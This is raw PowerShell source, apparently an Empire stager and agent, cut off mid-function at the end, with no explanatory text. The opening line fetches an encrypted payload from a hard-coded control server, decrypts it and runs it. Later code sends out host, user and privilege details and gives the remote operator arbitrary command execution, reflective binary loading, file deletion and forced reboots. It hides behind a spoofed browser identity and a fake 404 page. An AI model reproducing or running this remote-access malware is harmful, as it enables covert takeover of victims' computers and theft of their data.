
$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('NXHV4wuAiLX3ymsbnMABi2V05LOS1heN');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAA')));$t='/cdcosqpc/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=2MXHwZpaYP/Da5ptwR92ziczJ5I%3D");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..($data.length-1)];-join[Char[]](& $R $data ($IV+$K))|IEX
$Script:ControlServers = @("http://192.168.1.5:80");$Script:ServerIndex = 0;
# ==== DEFINE GET ====
$script:GetTask = {
try {
    if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
        # ==== BUILD ROUTING PACKET ====
        $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
        $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
        Add-Type -AssemblyName System.Web;$RoutingPacket=[System.Web.HttpUtility]::UrlEncode([System.Convert]::ToBase64string([System.Text.Encoding]::Default.GetBytes($RoutingPacket)));

        # ==== BUILD REQUEST ====
        $vWc = New-Object System.Net.WebClient;
        $vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        if ($Script:Proxy) {
            $vWc.Proxy = $Script:Proxy;
        }
$taskURI = '/ucD' | Get-Random;$taskURI += $RoutingPacket;$vWc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko');$vWc.Headers.Add('Cache-Control', 'no-cache');$vWc.Headers.Add('Pragma', 'no-cache');$body = '';$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);$data = $result;$data = [System.Text.Encoding]::Default.GetString($data);
# ==== INTERPRET RESULTS ====


# ==== RETURN RESULTS ====
$data = [System.Text.Encoding]::Default.GetBytes($data);
$data;
}

# ==== HANDLE ERROR ====
} catch [Net.WebException] {
$script:MissedCheckins += 1;
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
Start-Negotiate -S '$ser' -SK $SK -UA $ua;
}
}
};

# ==== DEFINE POST ====
$script:SendMessage = {
param($Packets);
if ($Packets) {

# ==== BUILD ROUTING PACKET ====
$EncBytes = Encrypt-Bytes $Packets;
$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);


# ==== BUILD REQUEST ====
if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
$vWc = New-Object System.Net.WebClient;

# ==== CONFIGURE PROXY ====
$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
if ($Script:Proxy) {
$vWc.Proxy = $Script:Proxy;
}
$taskURI = '/ucW' | Get-Random;$vWc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko');$vWc.Headers.Add('Cache-Control', 'no-cache');$vWc.Headers.Add('Pragma', 'no-cache');$body = $RoutingPacket;try {$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, 'POST', [System.Text.Encoding]::Default.GetBytes($body));
} catch [System.Net.WebException] {
if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
Start-Negotiate -S '$ser' -SK $SK -UA $ua;
}}}}};

$Script:ControlServers = @("http://192.168.1.5:80");$Script:ServerIndex = 0;$script:GetTask = {try {if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);Add-Type -AssemblyName System.Web;$RoutingPacket=[System.Web.HttpUtility]::UrlEncode([System.Convert]::ToBase64string([System.Text.Encoding]::Default.GetBytes($RoutingPacket)));$vWc = New-Object System.Net.WebClient;$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;if ($Script:Proxy) {$vWc.Proxy = $Script:Proxy;}$taskURI = '/ucD' | Get-Random;$taskURI += $RoutingPacket;$vWc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko');$vWc.Headers.Add('Cache-Control', 'no-cache');$vWc.Headers.Add('Pragma', 'no-cache');$body = '';$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);$data = $result;$data = [System.Text.Encoding]::Default.GetString($data);$data = [System.Text.Encoding]::Default.GetBytes($data);$data;}} catch [Net.WebException] {$script:MissedCheckins += 1;if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {Start-Negotiate -S '$ser' -SK $SK -UA $ua;}}};$script:SendMessage = {param($Packets);if ($Packets) {$EncBytes = Encrypt-Bytes $Packets;$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {$vWc = New-Object System.Net.WebClient;$vWc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$vWc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;if ($Script:Proxy) {$vWc.Proxy = $Script:Proxy;}$taskURI = '/ucW' | Get-Random;$vWc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko');$vWc.Headers.Add('Cache-Control', 'no-cache');$vWc.Headers.Add('Pragma', 'no-cache');$body = $RoutingPacket;try {$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, 'POST', [System.Text.Encoding]::Default.GetBytes($body));} catch [System.Net.WebException] {if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {Start-Negotiate -S '$ser' -SK $SK -UA $ua;}}}}};function Start-Negotiate {param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)function ConvertTo-RC4ByteStream {Param ($RCK, $In)begin {[Byte[]] $Str = 0..255;$J = 0;0..255 | ForEach-Object {$J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;$Str[$_], $Str[$J] = $Str[$J], $Str[$_];};$I = $J = 0;}process {ForEach($Byte in $In) {$I = ($I + 1) % 256;$J = ($J + $Str[$I]) % 256;$Str[$I], $Str[$J] = $Str[$J], $Str[$I];$Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];}}}function Decrypt-Bytes {param ($Key, $In)if($In.Length -gt 32) {$HMAC = New-Object System.Security.Cryptography.HMACSHA256;$e=[System.Text.Encoding]::ASCII;$Mac = $In[-10..-1];$In = $In[0..($In.length - 11)];$hmac.Key = $e.GetBytes($Key);$Expected = $hmac.ComputeHash($In)[0..9];if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {return;}$IV = $In[0..15];try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$AES.Mode = "CBC";$AES.Key = $e.GetBytes($Key);$AES.IV = $IV;($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)}}function Decode-RC4Packet {param ($RawData, $SKB)$IV = $RawData[0..3];$EncryptedData = $RawData[4..($RawData.Length - 1)];$DecryptedData = ConvertTo-RC4ByteStream -RCK ($IV + $SKB) -In $EncryptedData;$SessionID = [System.Text.Encoding]::ASCII.GetString($DecryptedData[0..7]);$Language = $DecryptedData[8];$Meta = $DecryptedData[9];$Extra = $DecryptedData[10..11];$Length = [BitConverter]::ToInt32($DecryptedData[12..15], 0);$EncryptedPayload = $EncryptedData[16..($EncryptedData.Length - 1)];return @{IV = $IV;SessionID = $SessionID;Language = $Language;Meta = $Meta;Extra = $Extra;Length = $Length;EncryptedPayload = $EncryptedPayload;}}$Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");$Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");$ErrorActionPreference = "SilentlyContinue";$e=[System.Text.Encoding]::UTF8;$customHeaders = "User-Agent:Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv%3A11.0) like Gecko";$SKB=$e.GetBytes($SK);try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$IV = [byte] 0..255 | Get-Random -count 16;$AES.Mode="CBC";$AES.Key=$SKB;$AES.IV = $IV;$hmac = New-Object System.Security.Cryptography.HMACSHA256;$hmac.Key = $SKB;$csp = New-Object System.Security.Cryptography.CspParameters;$csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;$rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;$rk=$rs.ToXmlString($False);$ID='00000000';$ib=$e.getbytes($rk);$eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);$eb=$eb+$hmac.ComputeHash($eb)[0..9];if(-not $wc) {$wc=New-Object System.Net.WebClient;$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;}if ($Script:Proxy) {$wc.Proxy = $Script:Proxy;}if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$IV=[BitConverter]::GetBytes($(Get-Random));$data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);$rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;$rc4p = $IV + $rc4p + $eb;$raw=$wc.UploadData($s+"//cdcosqpc/","POST",$rc4p);$DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;$ID=$DecodedPacket.SessionID;$EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;$DecryptedData=$e.GetString($rs.decrypt($EncryptedPayloadBytes,$false));$nonce=$DecryptedData[0..15] -join '';$key=$DecryptedData[16..$DecryptedData.length] -join '';$nonce=[String]([long]$nonce + 1);try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$IV = [byte] 0..255 | Get-Random -Count 16;$AES.Mode="CBC";$AES.Key=$e.GetBytes($key);$AES.IV = $IV;$i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;try{$p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);}catch {$p = "[FAILED]"}$ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};$i+="|$ip";try{$i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];}catch{$i+='|'+'[FAILED]'}if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$n=[System.Diagnostics.Process]::GetCurrentProcess();$i+='|'+$n.ProcessName+'|'+$n.Id;$i += "|powershell|" + $PSVersionTable.PSVersion.Major;$i += "|" + $env:PROCESSOR_ARCHITECTURE;$ib2=$e.getbytes($i);$eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);$hmac.Key = $e.GetBytes($key);$eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];$IV2=[BitConverter]::GetBytes($(Get-Random));$data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);$rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;$rc4p2 = $IV2 + $rc4p2 + $eb2;if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Hop-Name",$hop);$raw=$wc.UploadData($s+"//cdcosqpc/", "POST", $rc4p2);$DecodedPacket = Decode-RC4Packet -RawData $raw -SKB $SKB;$EncryptedPayloadBytes = [byte[]]$DecodedPacket.EncryptedPayload;IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $EncryptedPayloadBytes)) );$AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;[GC]::Collect();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "" -KillDate "" -ProxySettings $Script:Proxy;}Start-Negotiate -s "$ser" -SK 'NXHV4wuAiLX3ymsbnMABi2V05LOS1heN' -UA $u -hop "$hop";
function Invoke-Empire {
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $StagingKey,
        [Parameter(Mandatory=$true)]
        [String]
        $SessionKey,
        [Parameter(Mandatory=$true)]
        [String]
        $SessionID,
        [Int32]
        $AgentDelay = 1,
        [Double]
        $AgentJitter = 0.0,
        [String[]]
        $Servers,
        [String]
        $KillDate,
        [Int32]
        $KillDays,
        [String]
        $WorkingHours,
        [object]
        $ProxySettings,
        [String]
        $Profile = "/cdcosqpc/|Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
        [Int32]
        $LostLimit = 60,
        [String]
        $DefaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30KaDF7Zm9udC1zaXplOjIuNGVtO21hcmdpbjowO2NvbG9yOiNGRkY7fQpoMntmb250LXNpemU6MS43ZW07bWFyZ2luOjA7Y29sb3I6I0NDMDAwMDt9Cmgze2ZvbnQtc2l6ZToxLjJlbTttYXJnaW46MTBweCAwIDAgMDtjb2xvcjojMDAwMDAwO30KI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgo="
    )
    $Encoding = [System.Text.Encoding]::ASCII;
    $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
    $script:AgentDelay = $AgentDelay;
    $script:AgentJitter = $AgentJitter;
    $script:LostLimit = $LostLimit;
    $script:MissedCheckins = 0;
    $script:ResultIDs = @{};
    $script:WorkingHours = $WorkingHours;
    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
    $script:Proxy = $ProxySettings;
    $script:CurrentListenerName = "";
    $script:tasks = @{}
    $Script:ServerIndex = 0;
    $Script:ControlServers = $Servers;
    $Retries = 1;
    if($KillDays) {
        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
    }
    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
        $script:KillDate = $KillDate
    }
    $ProfileParts = $Profile.split('|');
    $script:TaskURIs = $ProfileParts[0].split(',');
    $script:UserAgent = $ProfileParts[1];
    $script:SessionID = $SessionID;
    $script:Headers = @{};
    if($ProfileParts[2]) {
        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
            $Parts = $_.Split(':');
            $script:Headers.Add($Parts[0],$Parts[1]);
        }
    }
    $Script:Downloads = @{};
    $script:ImportedScript = '';
    function ConvertTo-Rc4ByteStream {
        Param ($In, $RCK)
        begin {
            [Byte[]] $S = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $S[$_], $S[$J] = $S[$J], $S[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $S[$I]) % 256;
                $S[$I], $S[$J] = $S[$J], $S[$I];
                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
            }
        }
    }
    function Get-HexString {
        param([byte]$Data)
        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' ';
    }
    function Set-Delay {
        param([int]$d, [double]$j=0.0)
        $script:AgentDelay = $d;
        $script:AgentJitter = $j;
        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter";
    }
    function Get-Delay {
        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter";
    }
    function Set-LostLimit {
        param([int]$l)
        $script:LostLimit = $l;
        if($l -eq 0)
        {
            "agent set to never die based on checkin Limit";
        }
        else
        {
            "agent LostLimit set to $script:LostLimit";
        }
    }
    function Get-LostLimit {
        "agent LostLimit: $script:LostLimit";
    }
    function Set-Killdate {
        param([string]$date)
        $script:KillDate = $date;
        "agent killdate set to $script:KillDate";
    }
    function Get-Killdate {
        "agent killdate: $script:KillDate";
    }
    function Set-WorkingHours {
        param([string]$hours)
        $script:WorkingHours = $hours;
        "agent working hours set to $($script:WorkingHours)";
    }
    function Get-WorkingHours {
        "agent working hours: $($script:WorkingHours)";
    }
    function Get-Sysinfo {
        $str = '0|';
        $str += $Script:ControlServers[$Script:ServerIndex];
        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
        $str+="|$ip";
        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $str += '|True';
        }
        else{
            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');
        }
        $n = [System.Diagnostics.Process]::GetCurrentProcess();
        $str += '|'+$n.ProcessName+'|'+$n.Id;
        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
        $str;
    }
    function Invoke-ShellCommand {
        param($cmd, $cmdargs="")
        if ($cmdargs -like "*`"\\*") {
            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
        }
        elseif ($cmdargs -like "*\\*") {
            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
        }
        $output = '';
        if ($cmd.ToLower() -eq 'shell') {
            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
            else {
                $OldConsoleOut = [Console]::Out;
                $StringWriter = New-Object IO.StringWriter;
                [Console]::SetOut($StringWriter);
                $output = iex "$cmdargs" | out-string;
                [Console]::SetOut($OldConsoleOut);
                if ($output.length -eq 0){
                    $output = $StringWriter.ToString();
                    }
            }
            $output += "`n`r";
        }
        elseif ($cmd.ToLower() -eq 'reflectiveload'){
            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
            else{
                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
                $output = "`n`r Reflective Load Complete";
            }
        }
        else {
            switch -regex ($cmd) {
                '(ls|^dir)' {
                    if ($cmdargs.length -eq "") {
                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
                    }
                    else {
                        try{
                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
                        }
                        catch [System.Management.Automation.ActionPreferenceStopException] {
                            $output = "[!] Error: $_ (or cannot be accessed).";
                        }
                    }
                }
                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
                    if ($cmdargs.length -ne "") {
                        try {
                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
                            $output = "executed $cmd $cmdargs";
                        }
                        catch {
                            $output=$_.Exception;
                        }
                    }
                }
                cd {
                    if ($cmdargs.length -ne '')
                    {
                        $cmdargs = $cmdargs.trim("`"").trim("'");
                        cd "$cmdargs";
                        $output = pwd;
                    }
                }
                '(ipconfig|ifconfig)' {
                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
                        $out = New-Object psobject;
                        $out | Add-Member Noteproperty 'Description' $_.Description;
                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
                        $out
                    } | ConvertTo-Json;
                }
                '(ps|tasklist)' {
                    $owners = @{};
                    Get-WmiObject win32_process | ForEach-Object {
                        try {
                            $o = $_.getowner()
                            if (-not $($o.User)) {
                                $o = 'N/A'
                            } else {
                                $o = "$($o.Domain)\$($o.User)"
                            }
                        } catch {
                            $o = 'N/A'
                        }
                        $owners[$_.handle] = $o
                    }
                    if($cmdargs -ne '') { $p = $cmdargs }
                    else{ $p = "*" };
                    $output = Get-Process $p | ForEach-Object {
                        $arch = 'x64';
                        if ([System.IntPtr]::Size -eq 4) {
                            $arch = 'x86'
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                    $arch = 'x86';
                                    break
                                }
                            }
                        }
                        $out = New-Object psobject;
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
                        $out | Add-Member Noteproperty 'PID' $_.ID;
                        $out | Add-Member Noteproperty 'Arch' $arch;
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
                        $out | Add-Member Noteproperty 'MemUsage' $mem;
                        $out;
                    } | Sort-Object -Property PID | ConvertTo-Json;
                }
                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                route {
                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
                        $adapters = @{};
                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
                            $out = New-Object psobject;
                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
                            if ($_.NextHop -eq "0.0.0.0") {
                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
                            }
                            else{
                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
                            }
                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
                            }
                            else {
                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
                            }
                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
                            $out;
                        } | ConvertTo-Json;
                    }
                    else { $output = route $cmdargs };
                }
                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
                hostname {
                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
                }
                '(reboot|restart)' { Restart-Computer -force };
                shutdown { Stop-Computer -force };
                default {
                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
                    else { $output = IEX "$cmd $cmdargs" | Out-String };
                }
            }
        }
        "`n"+($output);
    }
    function Start-AgentJob {
        param($ScriptString)
        $AppDomain = [AppDomain]::CreateDomain($ResultID);
        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
        $null = $PSHost.AddScript($ScriptString);
        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
        $Script:tasks[$ResultID] = @{
            "result_id" = $ResultID
            "packet_type" = $type
            "status" = "running"
            "thread" = $Job
            "language" = $null
            "powershell" = @{
                "app_domain" = $AppDomain
                "ps_host" = $PSHost
                "buffer" = $Buffer
                "ps_host_exec" = $null
            }
        }
        $ResultID;
    }
    function Get-AgentJobCompleted {
        param($JobName)
        if ($script:tasks.ContainsKey($JobName)) {
            $jobCompleted = $script:tasks[$JobName]['thread'].IsCompleted
            if ($jobCompleted) {
                if ($script:tasks[$JobName]) {
                    $script:tasks[$JobName]['status'] = 'completed'
                } else {
                    return $false
                }
            }
            return $jobCompleted
        } else {
            return $false
        }
    }
    function Receive-AgentJob {
        param($JobName)
        if($script:tasks.ContainsKey($JobName)) {
            $script:tasks[$JobName]['powershell']['buffer'].ReadAll();
        }
    }
    function Stop-AgentJob {
        param($JobName)
        if ($script:tasks.ContainsKey($JobName)) {
            $Null = $script:tasks[$JobName]['powershell']['ps_host'].Stop()
            $results = $script:tasks[$JobName]['powershell']['buffer'].ReadAll()
            $Null = [AppDomain]::Unload($script:tasks[$JobName]['powershell']['app_domain'])
            $script:tasks[$JobName]['status'] = 'stopped'
            $script:tasks.Remove($JobName)
            return $results
        }
    }
    function Update-Profile {
        param($Profile)
